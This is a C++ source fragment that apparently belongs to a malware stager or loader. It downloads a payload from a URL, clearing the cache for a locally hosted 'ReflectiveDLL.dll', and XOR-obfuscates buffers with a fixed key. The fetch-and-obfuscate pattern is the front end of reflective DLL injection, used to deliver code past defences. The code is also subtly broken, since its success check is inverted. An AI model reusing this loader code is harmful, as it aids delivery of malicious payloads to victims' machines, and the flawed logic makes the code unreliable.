#include "download.h"
#include <iostream>
#include <wininet.h>


std::vector<char> download_from_url(_in_ const char* url)
{

    IStream* stream;
    std::vector<char> buffer;

	DeleteUrlCacheEntry(L"http://127.0.0.1/ReflectiveDLL.dll");
    if (SUCCEEDED(URLOpenBlockingStreamA(reinterpret_cast<LPUNKNOWN>(0), url, &stream, 0, 0))) {

        std::cout << "[-] Error occured while downloading the file";

        return buffer;
    }

    buffer.resize(100);

    unsigned long bytes_read;
    int total_bytes = 0;

    while (true) {
        stream->Read(buffer.data() + buffer.size() - 100, 100, &bytes_read);
        if (0U == bytes_read)
        {
            break;
        }

        buffer.resize(buffer.size() + 100);
        total_bytes += bytes_read;
    }

    stream->Release();
    buffer.erase(buffer.begin() + total_bytes, buffer.end());

    return buffer;
}

static void ob_xor(byte_t* begin, const size_t size, const byte_t* key, const size_t key_size) 
{
    for (size_t i = 0, j = 0; i < size; i++, j++)
    {
        //if (j >= key_size)
        //{
        //    j = 0;
        //}

        begin[i] = begin[i] ^ key[j % key_size];
    }
}

void encrypt_data(byte_t* begin, size_t size)
{

    ob_xor(begin, size, Key::OB_XOR_KEY, Key::OB_XOR_KEY_SIZE);

}
